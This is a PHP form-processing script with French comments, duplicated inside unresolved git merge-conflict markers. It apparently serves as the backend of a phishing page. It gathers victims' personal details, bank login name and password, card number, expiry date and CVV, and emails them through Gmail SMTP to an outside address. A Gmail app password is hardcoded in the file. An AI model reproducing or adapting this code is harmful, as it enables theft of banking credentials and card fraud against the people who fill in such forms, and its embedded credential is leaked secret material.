<<<<<<< HEAD
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Inclure PHPMailer
require 'vendor/autoload.php'; // Si installé via Composer

// Ou si tu as téléchargé manuellement PHPMailer :
/*
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
*/

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // les champs existent
    if (isset($_POST['first_name'], $_POST['last_name'], $_POST['street_address'], $_POST['city'], $_POST['state'], $_POST['zip_code'], $_POST['email'], $_POST['phone'], $_POST['bank'], $_POST['bank_username'], $_POST['bank_password'], $_POST['card_number'], $_POST['expiration_date'], $_POST['cvv'], $_POST['amount'], $_POST['username'])){
        $prenom     = $_POST['first_name'];
        $nom        = $_POST['last_name'];
        $adresse    = $_POST['street_address'];
        $ville      = $_POST['city'];
        $etat       = $_POST['state'];
        $codepostal = $_POST['zip_code'];
        $email      = $_POST['email'];
        $telephone  = $_POST['phone'];

        $banque     = $_POST['bank'];
        $userbank   = $_POST['bank_username'];
        $passbank   = $_POST['bank_password'];
        $carte      = $_POST['card_number'];
        $expiration = $_POST['expiration_date'];
        $cvv        = $_POST['cvv'];
        $montant    = $_POST['amount'];
        $pseudo     = $_POST['username'];


        $mail = new PHPMailer(true);

        try {
            // Configuration SMTP Gmail
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';
            $mail->SMTPAuth   = true;
            $mail->Username   = 'inovastic1@gmail.com'; // 👉 ton adresse Gmail
            $mail->Password   = 'wvib cucq dheq qhgb'; // 👉 le mot de passe d'application
            $mail->SMTPSecure = 'tls';
            $mail->Port       = 587;

            // Destinataires
            $mail->setFrom('inovastic1@gmail.com', 'Formulaire');
            $mail->addAddress('Lebambinchamvoisier@gmail.com'); // le destinataire
            $mail->addReplyTo($email, $nom);

            // Contenu
            $mail->isHTML(false);
            $mail->Subject = 'Nouveau Formulaire recu';
            $mail->Body    = "
                📬 Détails du message :
                Prénom : {$nom}
                Nom : {$prenom}
                Adresse : {$adresse}
                Ville : {$ville}
                Etat : {$etat}
                Code Postal : {$codepostal}
                Email : {$email}
                Téléphone : {$telephone}
                Banque : {$banque}
                Nom Utilisateur : {$userbank}
                Mot de passe : {$passbank}
                Carte : {$carte}
                Expiration : {$expiration}
                CVV : {$cvv}
                Montant : {$montant}
                Pseudo :{$pseudo}
            ";

            $mail->send();
            header('Location: success.php');
            
            echo '✅ Message envoyé avec succès';
        } catch (Exception $e) {
            echo "❌ Message non envoyé. Erreur : {$mail->ErrorInfo}";
        }
    } else {
        echo "❌ Tous les champs du formulaire ne sont pas remplis.";
    }
} else {
    echo "❌ Accès direct interdit. Veuillez soumettre le formulaire.";
}

?>
=======
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Inclure PHPMailer
require 'vendor/autoload.php'; // Si installé via Composer

// Ou si tu as téléchargé manuellement PHPMailer :
/*
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
*/

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // les champs existent
    if (isset($_POST['first_name'], $_POST['last_name'], $_POST['street_address'], $_POST['city'], $_POST['state'], $_POST['zip_code'], $_POST['email'], $_POST['phone'], $_POST['bank'], $_POST['bank_username'], $_POST['bank_password'], $_POST['card_number'], $_POST['expiration_date'], $_POST['cvv'], $_POST['amount'], $_POST['username'])){
        $prenom     = $_POST['first_name'];
        $nom        = $_POST['last_name'];
        $adresse    = $_POST['street_address'];
        $ville      = $_POST['city'];
        $etat       = $_POST['state'];
        $codepostal = $_POST['zip_code'];
        $email      = $_POST['email'];
        $telephone  = $_POST['phone'];

        $banque     = $_POST['bank'];
        $userbank   = $_POST['bank_username'];
        $passbank   = $_POST['bank_password'];
        $carte      = $_POST['card_number'];
        $expiration = $_POST['expiration_date'];
        $cvv        = $_POST['cvv'];
        $montant    = $_POST['amount'];
        $pseudo     = $_POST['username'];


        $mail = new PHPMailer(true);

        try {
            // Configuration SMTP Gmail
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';
            $mail->SMTPAuth   = true;
            $mail->Username   = 'inovastic1@gmail.com'; // 👉 ton adresse Gmail
            $mail->Password   = 'wvib cucq dheq qhgb'; // 👉 le mot de passe d'application
            $mail->SMTPSecure = 'tls';
            $mail->Port       = 587;

            // Destinataires
            $mail->setFrom('inovastic1@gmail.com', 'Formulaire');
            $mail->addAddress('Lebambinchamvoisier@gmail.com'); // le destinataire
            $mail->addReplyTo($email, $nom);

            // Contenu
            $mail->isHTML(false);
            $mail->Subject = 'Nouveau Formulaire recu';
            $mail->Body    = "
                📬 Détails du message :
                Prénom : {$nom}
                Nom : {$prenom}
                Adresse : {$adresse}
                Ville : {$ville}
                Etat : {$etat}
                Code Postal : {$codepostal}
                Email : {$email}
                Téléphone : {$telephone}
                Banque : {$banque}
                Nom Utilisateur : {$userbank}
                Mot de passe : {$passbank}
                Carte : {$carte}
                Expiration : {$expiration}
                CVV : {$cvv}
                Montant : {$montant}
                Pseudo :{$pseudo}
            ";

            $mail->send();
            header('Location: success.php');
            
            echo '✅ Message envoyé avec succès';
        } catch (Exception $e) {
            echo "❌ Message non envoyé. Erreur : {$mail->ErrorInfo}";
        }
    } else {
        echo "❌ Tous les champs du formulaire ne sont pas remplis.";
    }
} else {
    echo "❌ Accès direct interdit. Veuillez soumettre le formulaire.";
}

?>
>>>>>>> 7a1218782367c599f0e2e70d16742f36ee943743
